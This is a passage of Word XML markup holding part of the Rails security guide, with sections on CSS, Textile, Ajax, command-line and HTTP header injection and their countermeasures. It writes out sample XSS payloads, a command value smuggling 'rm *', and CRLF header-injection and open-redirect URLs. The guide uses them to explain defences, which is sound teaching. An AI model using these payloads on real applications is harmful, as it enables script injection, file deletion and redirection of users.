      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In the end, he got a 4 KB worm, which he injected into his profile page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4273E76F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:hyperlink r:id="rId738" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>moz-binding</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> property proved to be another way to introduce JavaScript in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in Gecko-based browsers (Firefox, for example).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73825D32" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>8.4.1 Countermeasures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B3E3921" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This example, again, showed that a blacklist filter is never complete. However, as custom </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in web applications is a quite rare feature, I am not aware of a whitelist </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> filter. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">If you want to allow custom colors or images, you can allow the user to choose them and build the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the web application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Use Rails’ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>sanitize()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method as a model for a whitelist </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> filter, if you really need one.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D228B77" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>8.5 Textile Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414D4466" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">If you want to provide text formatting other than </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> (due to security), use a mark-up language which is converted to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the server-side. </w:t>
      </w:r>
      <w:hyperlink r:id="rId739" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
            <w:i/>
            <w:iCs/>
          </w:rPr>
          <w:t>RedCloth</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> is such a language for Ruby, but without precautions, it is also vulnerable to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C45D3AC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For example, RedCloth translates </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_test_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Get the </w:t>
      </w:r>
      <w:hyperlink r:id="rId740" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>all-new version 4</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> that removed serious bugs. However, even that version has </w:t>
      </w:r>
      <w:hyperlink r:id="rId741" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>some security bugs</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>, so the countermeasures still apply. Here is an example for version 3.0.4:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="305ADD5B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2DD6466D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;').to_html</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10588E61" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; "&lt;script&gt;alert(1)&lt;/script&gt;"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="28EAB5CA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use the :filter_html option to remove </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which was not created by the Textile processor.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2CD96D80" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4F4CD608" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;', [:filter_html]).to_html</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51BBCDF7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; "alert(1)"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2C4A8924" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">However, this does not filter all </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t>, a few tags will be left (by design), for example &lt;a&gt;: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71A28CE" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="427BE20D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>RedCloth.new("&lt;a href='javascript:alert(1)'&gt;hello&lt;/a&gt;", [:filter_html]).to_html</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="259BDA80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; "&lt;p&gt;&lt;a href="javascript:alert(1)"&gt;hello&lt;/a&gt;&lt;/p&gt;"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="719C4B89" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>8.5.1 Countermeasures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="140ACBC5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It is recommended to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>use RedCloth in combination with a whitelist input filter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, as described in the countermeasures against </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> section.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3807EC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>8.6 Ajax Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6994F440" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>The same security precautions have to be taken for Ajax actions as for “normal” ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn’t render a view.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126B1D7C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you use the </w:t>
      </w:r>
      <w:hyperlink r:id="rId742" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>in_place_editor plugin</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">, or actions that return a string, rather than rendering a view, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>you have to escape the return value in the action</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Otherwise, if the return value contains a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3256D68B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>8.7 Command Line Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48716AB0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Use user-supplied command line parameters with caution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4216B3C2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and `command`. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BFB00CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A countermeasure is to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>system(command, parameters)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> method which passes command line parameters safely</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5760"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="799C686B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="675AA4D1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>system("/bin/echo","hello; rm *")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B71D8F1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># prints "hello; rm *" and does not delete files</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="005ECD08" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>8.8 Header Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FEC5EA2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> response splitting.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F74592" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) field. All of them are user-supplied and may be manipulated with more or less effort. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Remember to escape these header fields, too.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> For example when you display the user agent in an administration area.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E34B64C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Besides that, it is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>important to know what you are doing when building response headers partly based on user input.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> For example you want to redirect the user back to a specific page. To do that you introduced a “referer“ field in a form to redirect to the given address:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3A759D06" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="27426DA8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="574046432"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>redirect_to params[:referer]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4D15C499" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7338"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1AD8AB41" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5723FE1E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9">
            <w:pPr>
              <w:divId w:val="1217281465"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId743" w:history="1">
              <w:r w:rsidR="009A002D">
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="052E94BD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this: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418709E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="670CCC02" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
            <w:hyperlink r:id="rId744" w:history="1">
              <w:r w:rsidR="009A002D">
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="009A002D">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+Hi!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70FB4F27" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId745" w:history="1">
              <w:r w:rsidR="009A002D">
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="009A002D">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+</w:t>
            </w:r>
            <w:hyperlink r:id="rId746" w:history="1">
              <w:r w:rsidR="009A002D">
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://www.malicious.tld</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="68A55B80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note that “%0d%0a” is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t>-encoded for “\r\n” which is a carriage-return and line-feed (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CRLF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) in Ruby. So the resulting </w:t>
      </w:r>
      <w:r>
        <w:rPr>
